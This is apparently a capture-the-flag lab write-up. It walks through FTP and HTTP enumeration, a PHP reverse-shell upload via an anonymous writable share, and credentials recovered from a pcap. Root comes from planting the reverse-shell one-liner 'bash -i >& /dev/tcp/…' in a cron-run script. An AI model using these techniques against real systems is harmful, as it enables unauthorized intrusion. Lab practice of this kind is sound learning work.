

**Goal:** own root<br>
**Information given:** ip, not much else


### **Enumeration:**

  - nmap:
  - open ports:
      - 21: ftp      vsftpd 3.0.3
          - anonymous login allowed
      - 22: ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
      - 80: http     Apache httpd 2.4.18 ((Ubuntu))
  - OS: linux kernel
  - nothing great to get from the website


### **identifying vulnerabilities:**
   
- ftp login didn't get much either other than amongus memes
- possible user: Maya?
- the ftp fileshare is accessible from the `http://<target_ip>/files/` folder
  - try to put a php webshell in there and run it in the browser

### **Initial Exploit:**

- ftp in as user anonymous with no password
  - ftp folder is writable, so we can put pentestmonkey's php reverse shell there and load it through a web browser or curl
- FOOTHOLD: got a terminal as `www-data`
- **First Flag `cat /recipe.txt`**


### **Privilege Escalation:** lateral movement
- `etc/passwd lists` a user named ***lennie***
- root folder has security incidents folder
- `/incidents/suspicious.pcapng`
  - wireshark tcp stream 7 > someone tried to use lennie's credentials to run sudo from www-data
- credentials:
  - **Username:** *lennie*
  - **Password:** *c4ntg3t3n0ughsp1c3*
  - either `ssh` in separately or run `su lennie`<br>
- **Second Flag:** `cat /home/lennie/user.txt`


### **Privilege Escalation Continued:** get access to a root terminal
- `/home/lennie/scripts`
- lennie is able to run `planner.sh` but doesn't have permission to change `startup.txt`
  - planner.sh just dumps an environment variable `$LIST` into `startup.txt` and then runs `/etc/print.sh`
  - *lennie owns print.sh*
  - `sudo -l` doesn't return any useful results, lennie isn't in sudoers
- edited print.sh to add in a reverse shell in case root runs planner.sh periodically
- `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
- I caught it with *netcat* and got a root terminal!!
- **Third Flag:** `cat /root/root.txt`


tshark commands:
sudo tshark -r suspicious.pcapng -z "follow,tcp,ascii,2" and 7 for the terminal inputs
